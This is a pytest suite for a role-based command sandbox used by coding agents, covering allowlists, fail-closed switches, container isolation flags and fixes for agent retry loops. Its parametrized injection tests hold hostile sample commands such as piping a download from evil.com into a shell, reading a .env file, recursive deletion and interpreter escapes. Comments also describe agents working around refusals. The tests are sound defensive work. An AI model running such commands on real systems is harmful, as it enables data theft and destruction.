"""Tests for contained command execution.

These assert the *validation* boundary rather than real container runs: the
allowlist decision is the security control, and it must hold whether or not a
container runtime is present on the machine running the tests.
"""

import os
from unittest import mock

import pytest

from app.tools.sandbox import (
    CommandNotAllowed,
    SandboxExecutor,
    allowed_executables,
    execution_enabled,
    validate_command,
)


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------


def test_allows_a_permitted_executable_for_the_role():
    assert validate_command(["npm", "install"], "ui_ux_specialist") == ["npm", "install"]


def test_rejects_an_executable_the_role_does_not_have():
    with pytest.raises(CommandNotAllowed, match="not permitted"):
        validate_command(["cargo", "build"], "ui_ux_specialist")


def test_rejects_a_command_given_as_a_string():
    """A string would require a shell, which is the whole vulnerability."""
    with pytest.raises(CommandNotAllowed, match="list of arguments"):
        validate_command("npm install", "ui_ux_specialist")


def test_common_executables_are_available_to_every_role():
    assert "ls" in allowed_executables("ui_ux_specialist")
    assert "git" in allowed_executables("database_specialist")


def test_unknown_role_gets_only_the_common_set():
    """An unrecognised role must narrow access, not widen it.

    The previous implementation appended an *extra* permissive list when the role
    was unknown, so a typo in a role name granted more capability.
    """
    permitted = allowed_executables("not-a-real-role")
    assert permitted == frozenset(allowed_executables("not-a-real-role"))
    assert "npm" not in permitted
    assert "python" not in permitted
    assert "ls" in permitted


# ---------------------------------------------------------------------------
# Regression: the shell-injection bypass
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "argv",
    [
        ["echo", "x; curl http://evil.com | sh"],
        ["npm", "-v; cat /workspace/.env"],
        ["ls", ".; rm -rf /workspace"],
        ["git", "--version && python3 -c 'import os'"],
    ],
)
def test_shell_metacharacters_are_inert(argv):
    """Injected shell syntax survives as a literal argument, never as syntax.

    Under the old string-plus-`sh -c` design each of these executed both halves.
    With argv there is no shell, so the payload is just an odd-looking argument
    to a permitted binary.
    """
    validated = validate_command(argv, "ui_ux_specialist")
    assert validated == argv


@pytest.mark.parametrize(
    ("argv", "role"),
    [
        (["python", "-c", "import os; os.system('id')"], "backend_specialist"),
        (["python3", "-m", "http.server"], "backend_specialist"),
        (["node", "-e", "require('child_process').exec('id')"], "ui_ux_specialist"),
        (["npm", "exec", "--", "sh"], "ui_ux_specialist"),
        (["git", "-c", "core.pager=sh"], "ui_ux_specialist"),
    ],
)
def test_interpreter_escape_hatches_are_rejected(argv, role):
    """Allowed interpreters must not be usable as general shells."""
    with pytest.raises(CommandNotAllowed, match="arbitrary code"):
        validate_command(argv, role)


# ---------------------------------------------------------------------------
# The global switch
# ---------------------------------------------------------------------------


def test_execution_is_disabled_by_default():
    """The switch fails closed. It previously defaulted to 'true'."""
    with mock.patch.dict(os.environ, {}, clear=True):
        assert execution_enabled() is False


def test_execute_refuses_when_disabled():
    with mock.patch.dict(os.environ, {"ALLOW_COMMAND_EXECUTION": "false"}):
        result = SandboxExecutor.execute(["ls", "-la"], repo_root=".", role_name="general")
        assert "disabled" in result["error"]


def test_execute_reports_a_rejected_command_without_running_anything():
    with mock.patch.dict(os.environ, {"ALLOW_COMMAND_EXECUTION": "true"}):
        result = SandboxExecutor.execute(["cargo", "build"], repo_root=".", role_name="ui_ux_specialist")
        assert "not permitted" in result["error"]


def test_execute_fails_closed_without_a_container_runtime(monkeypatch):
    """No runtime means no execution - never a fall back to the host."""
    monkeypatch.setattr("shutil.which", lambda _name: None)
    with mock.patch.dict(
        os.environ,
        {"ALLOW_COMMAND_EXECUTION": "true", "SANDBOX_EXECUTION_MODE": "container"},
    ):
        result = SandboxExecutor.execute(["ls"], repo_root=".", role_name="general")
        assert "container runtime" in result["error"]


def test_container_invocation_is_hardened(monkeypatch):
    """Every isolation flag must be present on the actual docker invocation.

    The mode is pinned rather than inherited: a developer whose `.env` selects
    in-container execution would otherwise have this pass without ever building
    a docker command line.
    """
    captured = {}

    class _Result:
        stdout, stderr, returncode = "", "", 0

    def _fake_run(cmd, **_kwargs):
        captured["cmd"] = cmd
        return _Result()

    monkeypatch.setattr("shutil.which", lambda name: "/usr/bin/docker" if name == "docker" else None)
    monkeypatch.setattr("subprocess.run", _fake_run)

    with mock.patch.dict(
        os.environ,
        {"ALLOW_COMMAND_EXECUTION": "true", "SANDBOX_EXECUTION_MODE": "container"},
    ):
        SandboxExecutor.execute(["ls"], repo_root=".", role_name="general")

    cmd = captured["cmd"]
    assert "--network" in cmd and cmd[cmd.index("--network") + 1] == "none"
    for flag in ("--memory", "--cpus", "--pids-limit", "--read-only"):
        assert flag in cmd
    assert cmd[cmd.index("--cap-drop") + 1] == "ALL"
    assert cmd[cmd.index("--security-opt") + 1] == "no-new-privileges"


def test_install_category_is_the_only_one_with_network(monkeypatch):
    captured = {}

    class _Result:
        stdout, stderr, returncode = "", "", 0

    monkeypatch.setattr("shutil.which", lambda name: "/usr/bin/docker" if name == "docker" else None)
    monkeypatch.setattr("subprocess.run", lambda cmd, **_k: (captured.update(cmd=cmd), _Result())[1])

    with mock.patch.dict(
        os.environ,
        {"ALLOW_COMMAND_EXECUTION": "true", "SANDBOX_EXECUTION_MODE": "container"},
    ):
        SandboxExecutor.execute(["npm", "install"], repo_root=".", role_name="ui_ux_specialist", category="install")
    assert captured["cmd"][captured["cmd"].index("--network") + 1] == "bridge"

    with mock.patch.dict(
        os.environ,
        {"ALLOW_COMMAND_EXECUTION": "true", "SANDBOX_EXECUTION_MODE": "container"},
    ):
        SandboxExecutor.execute(["npm", "test"], repo_root=".", role_name="ui_ux_specialist", category="test")
    assert captured["cmd"][captured["cmd"].index("--network") + 1] == "none"


# ---------------------------------------------------------------------------
# Command output must not teach the agent a path it cannot use
#
# A command runs with the workspace at its real host path, so anything it prints
# quotes that path. The agent reads it and uses it, and every filesystem tool it
# holds then fails - inside the agent the workspace is rooted at "/".
#
# Measured on run-0b55ad49: two stages called `ls` against that exact string
# four times each, every attempt returning path_not_found, and passed it to
# `node` and `read_file` besides. 64 of 378 tool calls in that run were repeats,
# and this was the single largest cause.
# ---------------------------------------------------------------------------


WORKSPACE = "/app/data/workspaces/low-run-0b55ad49-2918-4325-8534-1be504ee3927"


def test_a_host_path_in_output_becomes_workspace_relative():
    from app.tools.sandbox import _as_workspace_relative

    rewritten = _as_workspace_relative(
        f"Error: Cannot find module '{WORKSPACE}/simple-todo-list-app/verify.js'", WORKSPACE
    )

    assert WORKSPACE not in rewritten
    # Relative, not rooted: commands run with the workspace as their working
    # directory, so this is the form that works when the agent pastes it back.
    assert "simple-todo-list-app/verify.js" in rewritten
    assert "/simple-todo-list-app" not in rewritten


def test_a_rewritten_path_has_no_stray_separator():
    from app.tools.sandbox import _as_workspace_relative

    assert _as_workspace_relative(f"{WORKSPACE}/app.js:12", WORKSPACE) == "app.js:12"
    assert _as_workspace_relative(f"{WORKSPACE}/docs/spec.md", WORKSPACE) == "docs/spec.md"
    # The bare root is the workspace itself.
    assert _as_workspace_relative(f"cwd {WORKSPACE}", WORKSPACE) == "cwd ."


def test_output_without_the_path_is_untouched():
    from app.tools.sandbox import _as_workspace_relative

    text = "1 passed, 0 failed in 0.4s"
    assert _as_workspace_relative(text, WORKSPACE) == text


def test_a_missing_workspace_never_raises():
    """Narration and scrubbing must not be able to fail a command."""
    from app.tools.sandbox import _as_workspace_relative

    assert _as_workspace_relative("text", "") == "text"
    assert _as_workspace_relative("", WORKSPACE) == ""
    assert _as_workspace_relative("text", "/") == "text"


# ---------------------------------------------------------------------------
# Every role must be able to run its own work
#
# `ROLE_EXECUTABLES` is keyed by the name the sandbox is called with -
# `f"{role}_specialist"`. A key that matches no role is not an error anywhere:
# `allowed_executables` falls back to the common set and the role simply runs
# crippled. On run-0b55ad49 the frontend specialist was refused `node` eight
# times while building a web page, because the key said `ui_specialist` and the
# role is `ui_ux`. Three of six roles had no entry at all.
# ---------------------------------------------------------------------------


def test_every_specialist_role_has_an_allowlist():
    """A role with no entry runs with the common set and nobody is told."""
    import typing

    from app.agents.technical_lead import SpecialistRole
    from app.tools.sandbox import ROLE_EXECUTABLES

    missing = [
        f"{role}_specialist"
        for role in typing.get_args(SpecialistRole)
        if f"{role}_specialist" not in ROLE_EXECUTABLES
    ]

    assert not missing, f"no allowlist entry for: {', '.join(missing)}"


def test_no_allowlist_entry_matches_a_role_that_does_not_exist():
    """The other half: a misspelled key is dead weight that looks deliberate."""
    import typing

    from app.agents.technical_lead import SpecialistRole
    from app.tools.sandbox import ROLE_EXECUTABLES

    known = {f"{role}_specialist" for role in typing.get_args(SpecialistRole)}
    # Non-specialist agents legitimately have entries too.
    non_specialist = {"principal_architect"}
    orphans = set(ROLE_EXECUTABLES) - known - non_specialist

    assert not orphans, f"allowlist entries matching no role: {', '.join(sorted(orphans))}"


def test_a_role_that_builds_a_web_page_can_run_node():
    from app.tools.sandbox import allowed_executables

    assert "node" in allowed_executables("ui_ux_specialist")
    assert "npm" in allowed_executables("ui_ux_specialist")


def test_a_role_that_audits_an_application_can_run_it():
    from app.tools.sandbox import allowed_executables

    allowed = allowed_executables("security_reliability_specialist")
    assert "node" in allowed and "python3" in allowed


def test_read_only_inspection_is_available_to_every_role():
    """`grep` was 17 of 43 refusals, and each cost a model call to discover."""
    from app.tools.sandbox import allowed_executables

    for role in ("ui_ux_specialist", "documentation_specialist", "unknown_role"):
        assert "grep" in allowed_executables(role)


def test_an_unknown_role_still_gets_nothing_extra():
    """A typo must narrow access, never widen it."""
    from app.tools.sandbox import COMMON_EXECUTABLES, allowed_executables

    assert allowed_executables("not_a_role") == COMMON_EXECUTABLES


# ---------------------------------------------------------------------------
# Bounding memory must not bound address space
#
# `RLIMIT_AS` caps address space, and a modern runtime reserves far more of that
# than it uses: V8 and WebAssembly reserve multi-gigabyte contiguous ranges as a
# bounds-check trick and touch almost none of it. Against a 2 GB address-space
# cap, every WASM instantiation fails.
#
# On run-0b55ad49 that produced `WebAssembly.Instance(): Out of memory` 24
# times, the milestone review concluded "no test commands succeeded in the
# workspace", and agents had begun writing `WebAssembly = null` stubs to work
# around a limit that was never about their memory use.
# ---------------------------------------------------------------------------


def test_the_memory_cap_does_not_limit_address_space():
    """Same number, right knob: the heap is bounded, the reservation is not."""
    import os
    import resource
    import subprocess
    import sys

    from app.tools.sandbox import _apply_limits, _memory_limit_bytes

    probe = (
        "import resource;"
        "print(resource.getrlimit(resource.RLIMIT_AS)[0]);"
        "print(resource.getrlimit(resource.RLIMIT_DATA)[0])"
    )
    result = subprocess.run(
        [sys.executable, "-c", probe],
        capture_output=True, text=True, timeout=60,
        preexec_fn=_apply_limits,
    )
    address_space, data = (int(line) for line in result.stdout.split())

    assert address_space == resource.RLIM_INFINITY, (
        "address space must stay unbounded - capping it breaks every WASM runtime"
    )
    assert data == _memory_limit_bytes(), "the heap must still be bounded"
    assert os.getpgid(0) is not None  # sanity: the helper still ran


def test_a_runaway_allocation_is_still_stopped():
    """The bound has to keep working, or this is a regression dressed as a fix."""
    import subprocess
    import sys

    from app.tools.sandbox import _apply_limits

    # Ask for far more heap than the cap allows, in one go.
    greedy = "x = bytearray(8 * 1024**3); print('allocated')"
    result = subprocess.run(
        [sys.executable, "-c", greedy],
        capture_output=True, text=True, timeout=120,
        preexec_fn=_apply_limits,
    )

    assert result.returncode != 0, "an 8 GiB allocation must not succeed under a 2 GiB cap"
    assert "allocated" not in result.stdout


# ---------------------------------------------------------------------------
# A test runner the testing role can actually run
#
# The role whose job is running tests could run `pytest` and no JavaScript
# runner at all, on a brief that is explicitly HTML/CSS/JavaScript. The refusal
# bought nothing - `npx` was permitted, so `npx jest` ran jest anyway - and cost
# the agent a workaround: writing a test script into a root `package.json`,
# which is the manifest collision guarded below.
# ---------------------------------------------------------------------------


def test_the_testing_role_can_run_a_javascript_test_runner():
    from app.tools.sandbox import allowed_executables

    allowed = allowed_executables("testing_specialist")

    assert {"jest", "mocha", "vitest"} <= allowed
    assert "pytest" in allowed, "the Python runner must not be lost"


def test_a_test_runner_is_still_not_a_shell():
    """Widening the list must not admit a general interpreter."""
    from app.tools.sandbox import allowed_executables

    for role in ("testing_specialist", "ui_ux_specialist"):
        allowed = allowed_executables(role)
        assert "sh" not in allowed and "bash" not in allowed and "eval" not in allowed


# ---------------------------------------------------------------------------
# A package manager must not scaffold beside the project
#
# Commands run with the workspace root as their working directory, so
# `npm install` there creates `package.json` and `node_modules` beside a project
# that has its own. On run-0b55ad49 that meant jest 30 at the root running the
# project's jest-29 tests, and three remediation rounds spent on "Identifier
# 'jest' has already been declared". `write_artifact` already refused a root
# manifest; a package manager reached the same file through another door.
# ---------------------------------------------------------------------------


def _pinned(tmp_path, name="todo-app"):
    (tmp_path / ".project-directory").write_text(f"{name}\n")
    return str(tmp_path)


def test_installing_at_the_root_is_refused_once_a_project_is_pinned(tmp_path):
    from app.tools.sandbox import manifest_written_outside_the_project as guard

    refusal = guard(["npm", "install"], _pinned(tmp_path))

    assert refusal is not None
    assert "todo-app" in refusal, "the refusal must name where it belongs"
    assert "--prefix" in refusal, "and how to get there"


def test_aiming_the_package_manager_at_the_project_is_allowed(tmp_path):
    from app.tools.sandbox import manifest_written_outside_the_project as guard

    root = _pinned(tmp_path)

    assert guard(["npm", "install", "--prefix", "todo-app"], root) is None
    assert guard(["npm", "install", "--prefix=todo-app"], root) is None


def test_commands_that_write_no_manifest_are_untouched(tmp_path):
    from app.tools.sandbox import manifest_written_outside_the_project as guard

    root = _pinned(tmp_path)

    for command in (["npm", "test"], ["npx", "jest"], ["ls", "-R"], ["node", "app.js"]):
        assert guard(command, root) is None, command


def test_nothing_is_refused_before_a_project_exists(tmp_path):
    """The first scaffold has nothing to collide with."""
    from app.tools.sandbox import manifest_written_outside_the_project as guard

    assert guard(["npm", "init", "-y"], str(tmp_path)) is None


def test_the_refusal_reaches_the_agent_as_a_tool_result(tmp_path):
    """A guard that raises would crash the stage instead of correcting it."""
    from app.tools.sandbox import SandboxExecutor

    result = SandboxExecutor.execute(
        command=["npm", "install"], repo_root=_pinned(tmp_path),
        role_name="testing_specialist", category="install",
    )

    assert "error" in result
    assert "todo-app" in result["error"]


# --- commands that never exit -------------------------------------------


def test_a_static_file_server_is_refused_rather_than_timed_out() -> None:
    """Half of every command timeout on record.

    An agent wants to "open the page", there is no browser here to open it
    with, and the server then serves nobody until the 120-second timeout kills
    it. Every one of these is a real call from a stored run that returned
    nothing after two minutes:

        run-cbd22a34  npx serve . -p 8000       (and retried without the dot)
        run-cbb1a5fc  npx http-server -p 8765 --silent
        run-2eb3aa24  npx --yes serve -p 3000   (retried)

    A refusal costs nothing and says what to do instead. This is the shape of
    the `node -e` refusal, which works: run-5d83e946 hit it twice and the agent
    put the code in a file both times.
    """
    import pytest

    from app.tools.sandbox import CommandNotAllowed, validate_command

    for argv in (
        ["npx", "serve", ".", "-p", "8000"],
        ["npx", "--yes", "serve", "-p", "3000"],
        ["npx", "http-server", "-p", "8765", "--silent"],
    ):
        with pytest.raises(CommandNotAllowed) as refusal:
            validate_command(argv, "ui_ux_specialist")
        assert "runs until it is stopped" in str(refusal.value)
        # It must say what to do instead, or it only moves the behaviour.
        assert "import it and call it" in str(refusal.value)

    # `python3 -m http.server` is the same idea from the other language, and
    # the module allowlist already refuses it - with its own wording. Asserted
    # as "refused", not "refused by this guard", so whichever catches it first
    # keeps the behaviour.
    with pytest.raises(CommandNotAllowed):
        validate_command(["python3", "-m", "http.server"], "ui_ux_specialist")


def test_the_commands_the_workflow_depends_on_are_not_refused() -> None:
    """A guard that catches the test runner would cost far more than it saves."""
    from app.tools.sandbox import _starts_a_server

    for argv in (
        ["node", "--test", "app.test.mjs"],
        ["npm", "test"],
        ["npx", "jest", "--verbose"],
        ["node", "--check", "app.js"],
        ["npx", "vite", "build"],
    ):
        assert _starts_a_server(argv) is None, argv


def test_a_timeout_says_why_a_command_might_not_finish() -> None:
    """"Command timed out" alone tells an agent nothing about the cause.

    The commonest cause is not slowness: it is a command that was never going
    to exit. The name check refuses the ones it can recognise, but
    run-2eb3aa24's ui specialist wrote its own server, `node serve-test.mjs`,
    and ran it twice for 120 seconds each. No name check can catch that; the
    message it gets back can still explain it.
    """
    import inspect

    from app.tools import sandbox

    source = inspect.getsource(sandbox)
    # Both return paths carry it, which is the mistake this codebase keeps
    # making: reaching one of two.
    assert source.count("_TIMEOUT_ADVICE") == 3
    assert "usually one that was not meant to" in sandbox._TIMEOUT_ADVICE
    assert "import it and call it" in sandbox._TIMEOUT_ADVICE


# --- the project directory written twice ---------------------------------


def test_a_doubled_project_directory_is_repaired(tmp_path) -> None:
    """`todo-app/todo-app/app.test.mjs` exists nowhere.

    An agent that sets `working_directory` to the project and then writes the
    project into the path as well produces it. Seen in at least seven runs:
    run-2b5def74, run-61c5a5b6 (six times), run-cbb1a5fc, run-da6c5e19,
    run-2eb3aa24. Nothing says whether a path argument resolves against the
    workspace root or against `working_directory`, so the agent guesses.
    """
    from app.tools.sandbox import strip_a_doubled_working_directory

    (tmp_path / "todo-app").mkdir()
    (tmp_path / "todo-app/app.test.mjs").write_text("//\n", encoding="utf-8")

    command, note = strip_a_doubled_working_directory(
        ["node", "--test", "todo-app/app.test.mjs"], str(tmp_path), "todo-app"
    )

    assert command == ["node", "--test", "app.test.mjs"]
    assert "already" in note and "todo-app/app.test.mjs -> app.test.mjs" in note


def test_a_path_that_exists_as_written_is_never_touched(tmp_path) -> None:
    """The property that makes this safe rather than clever.

    A project that genuinely contains a directory of its own name resolves as
    written, because then the original exists and nothing is rewritten.
    """
    from app.tools.sandbox import strip_a_doubled_working_directory

    (tmp_path / "pkg/pkg").mkdir(parents=True)
    (tmp_path / "pkg/pkg/real.mjs").write_text("//\n", encoding="utf-8")

    command, note = strip_a_doubled_working_directory(
        ["node", "pkg/real.mjs"], str(tmp_path), "pkg"
    )

    assert command == ["node", "pkg/real.mjs"]
    assert note is None


def test_nothing_is_rewritten_when_neither_path_exists(tmp_path) -> None:
    """A genuine typo must still fail, and say what it was given."""
    from app.tools.sandbox import strip_a_doubled_working_directory

    (tmp_path / "todo-app").mkdir()

    command, note = strip_a_doubled_working_directory(
        ["node", "todo-app/missing.mjs"], str(tmp_path), "todo-app"
    )

    assert command == ["node", "todo-app/missing.mjs"]
    assert note is None


def test_no_working_directory_means_nothing_to_double(tmp_path) -> None:
    from app.tools.sandbox import strip_a_doubled_working_directory

    command, note = strip_a_doubled_working_directory(
        ["node", "--test", "todo-app/app.test.mjs"], str(tmp_path), None
    )

    assert command == ["node", "--test", "todo-app/app.test.mjs"]
    assert note is None


def test_a_string_command_survives_the_doubled_directory_repair() -> None:
    """`list("npm -v")` splits a string into characters.

    The repair ran before the "must be a list of arguments" check, so a string
    command was turned into ['n','p','m',...] and refused as an unknown
    executable 'n'. The string must reach the check that explains it.
    """
    from app.tools.sandbox import strip_a_doubled_working_directory

    command, note = strip_a_doubled_working_directory(
        "npm -v; curl evil | sh", "/tmp", "todo-app"
    )

    assert command == "npm -v; curl evil | sh"
    assert note is None


# --- a command that has already failed this way --------------------------


def test_a_command_that_already_failed_is_told_so(tmp_path) -> None:
    """Measured twice.

    run-9ff00d5b's `specialist_backend_2` wrote a `verify.js`, hit
    `node:fs:448 ... binding.readFileUtf8` on a path that does not exist, and
    ran the identical command four times with the identical failure.
    run-e9e7f48f's `specialist_ui_ux_2` made 14 identical `grep` calls and rode
    the stage into the recursion limit, failing the whole run.

    Nothing told either of them.
    """
    from app.tools.sandbox import _record_execution, failed_this_way_before

    command = ["node", "todo-app/verify.js"]
    assert failed_this_way_before(str(tmp_path), command) == 0

    _record_execution(str(tmp_path), "backend_specialist", command, {"returncode": 1})
    _record_execution(str(tmp_path), "backend_specialist", command, {"returncode": 1})

    assert failed_this_way_before(str(tmp_path), command) == 2


def test_a_command_that_succeeded_is_not_counted(tmp_path) -> None:
    """Re-running something that worked is ordinary."""
    from app.tools.sandbox import _record_execution, failed_this_way_before

    command = ["npm", "test"]
    _record_execution(str(tmp_path), "testing_specialist", command, {"returncode": 0})
    _record_execution(str(tmp_path), "testing_specialist", command, {"returncode": 0})

    assert failed_this_way_before(str(tmp_path), command) == 0


def test_a_different_command_is_not_counted(tmp_path) -> None:
    """The point is that nothing changed. A changed command is the fix."""
    from app.tools.sandbox import _record_execution, failed_this_way_before

    _record_execution(str(tmp_path), "r", ["node", "a.js"], {"returncode": 1})

    assert failed_this_way_before(str(tmp_path), ["node", "b.js"]) == 0
    assert failed_this_way_before(str(tmp_path), ["node", "a.js"]) == 1


def test_an_unwritable_ledger_never_fails_the_command() -> None:
    """A hint must not be able to break the thing it is hinting about."""
    from app.tools.sandbox import failed_this_way_before

    assert failed_this_way_before("/definitely/not/here", ["node", "a.js"]) == 0


def test_an_edit_clears_the_previous_failure(tmp_path) -> None:
    """The false positive this check shipped with.

    Caught live on run-37476645's `specialist_testing_2`, in the first run
    after the check shipped. The trace is EDIT, RUN, EDIT, RUN, EDIT, RUN - a
    specialist debugging a suite exactly as it should - and it was told
    twenty-six times that it had changed nothing and should change something.

    The settled-answer middleware and both repeat-read notices already treat a
    write as invalidating what came before. This did not, and should have.
    """
    import time

    from app.tools.sandbox import _record_execution, failed_this_way_before

    (tmp_path / "proj").mkdir()
    suite = tmp_path / "proj/app.test.mjs"
    suite.write_text("v1\n", encoding="utf-8")
    command = ["node", "--test", "proj/app.test.mjs"]

    _record_execution(str(tmp_path), "r", command, {"returncode": 1})
    time.sleep(0.02)
    assert failed_this_way_before(str(tmp_path), command) == 1

    suite.write_text("v2 - the agent fixed it\n", encoding="utf-8")

    assert failed_this_way_before(str(tmp_path), command) == 0


def test_a_failure_with_nothing_written_since_still_counts(tmp_path) -> None:
    """The case the check exists for: run-e9e7f48f's 14 identical greps and
    run-9ff00d5b's four identical failing commands, neither preceded by a
    change of any kind."""
    import time

    from app.tools.sandbox import _record_execution, failed_this_way_before

    (tmp_path / "proj").mkdir()
    (tmp_path / "proj/a.js").write_text("x\n", encoding="utf-8")
    command = ["node", "proj/a.js"]

    _record_execution(str(tmp_path), "r", command, {"returncode": 1})
    time.sleep(0.02)
    _record_execution(str(tmp_path), "r", command, {"returncode": 1})
    time.sleep(0.02)

    assert failed_this_way_before(str(tmp_path), command) == 2


def test_a_command_that_already_passed_unchanged_is_counted(tmp_path) -> None:
    """The leak the failure-side check left open.

    Measured on run-ae4b717e's `specialist_ui_ux_1`: eleven identical
    `node -c task-manager/app.js`, every one exit 0 with empty output and no
    write between any of them. Worse on run-9ff00d5b's `test_round_0`: one
    passing `node --test todo-app/app.test.mjs` run twenty-eight times, and
    that run died in the recursion limit.
    """
    from app.tools.sandbox import _record_execution, succeeded_this_way_before

    command = ["node", "-c", "task-manager/app.js"]
    assert succeeded_this_way_before(str(tmp_path), command) == 0

    _record_execution(str(tmp_path), "ui_ux_specialist", command, {"returncode": 0})
    _record_execution(str(tmp_path), "ui_ux_specialist", command, {"returncode": 0})

    assert succeeded_this_way_before(str(tmp_path), command) == 2


def test_a_command_that_failed_is_not_counted_as_a_pass(tmp_path) -> None:
    """Retrying something broken is the behaviour the other check owns."""
    from app.tools.sandbox import _record_execution, succeeded_this_way_before

    command = ["node", "verify.js"]
    _record_execution(str(tmp_path), "r", command, {"returncode": 1})

    assert succeeded_this_way_before(str(tmp_path), command) == 0


def test_a_write_clears_the_previous_pass(tmp_path) -> None:
    """The same lesson finding 73 taught the failure side.

    A specialist that edits the file under test and re-runs the suite has
    changed the situation, and "you already have this result" is then false.
    """
    import time

    from app.tools.sandbox import _record_execution, succeeded_this_way_before

    (tmp_path / "proj").mkdir()
    suite = tmp_path / "proj/app.test.mjs"
    suite.write_text("v1\n", encoding="utf-8")
    command = ["node", "--test", "proj/app.test.mjs"]

    _record_execution(str(tmp_path), "r", command, {"returncode": 0})
    assert succeeded_this_way_before(str(tmp_path), command) == 1

    time.sleep(0.01)
    suite.write_text("v2\n", encoding="utf-8")

    assert succeeded_this_way_before(str(tmp_path), command) == 0


def test_the_agent_s_own_package_cache_is_not_a_change(tmp_path) -> None:
    """The sandbox puts HOME and npm's cache inside the workspace.

    If a blob landing under `node_modules` or `.agent-home` counted as a
    change, the note would never fire in any run that had installed anything -
    which is every run that gets far enough to matter.
    """
    import time

    from app.tools.sandbox import _record_execution, succeeded_this_way_before

    (tmp_path / "proj").mkdir()
    (tmp_path / "proj/app.js").write_text("x\n", encoding="utf-8")
    command = ["node", "-c", "proj/app.js"]
    _record_execution(str(tmp_path), "r", command, {"returncode": 0})

    time.sleep(0.01)
    cache = tmp_path / "node_modules/left-pad"
    cache.mkdir(parents=True)
    (cache / "index.js").write_text("installed\n", encoding="utf-8")

    assert succeeded_this_way_before(str(tmp_path), command) == 1


def test_an_unreadable_ledger_never_fails_the_command() -> None:
    from app.tools.sandbox import succeeded_this_way_before

    assert succeeded_this_way_before("/definitely/not/here", ["node", "a.js"]) == 0


def test_the_note_tells_a_finished_verification_to_answer(tmp_path) -> None:
    """The two halves say "you already have this" and then ask for opposite moves."""
    from app.tools.sandbox import _note_about_running_this_again, _record_execution

    command = ["node", "--test", "proj/app.test.mjs"]
    root = str(tmp_path)
    assert _note_about_running_this_again(root, command, {"returncode": 0}) == ""

    _record_execution(root, "r", command, {"returncode": 0})
    note = _note_about_running_this_again(root, command, {"returncode": 0})

    assert "already passed 1 time(s)" in note
    assert "return your structured answer" in note
    assert "will fail again" not in note


def test_the_note_still_tells_a_repeated_failure_to_change_something(tmp_path) -> None:
    from app.tools.sandbox import _note_about_running_this_again, _record_execution

    command = ["node", "verify.js"]
    root = str(tmp_path)
    _record_execution(root, "r", command, {"returncode": 1})

    note = _note_about_running_this_again(root, command, {"returncode": 1})

    assert "already failed 1 time(s)" in note
    assert "will fail again" in note


def test_a_refused_command_gets_no_note(tmp_path) -> None:
    """A refusal has no exit code, and neither check has anything to say."""
    from app.tools.sandbox import _note_about_running_this_again

    assert _note_about_running_this_again(str(tmp_path), ["node", "a.js"], {"error": "no"}) == ""
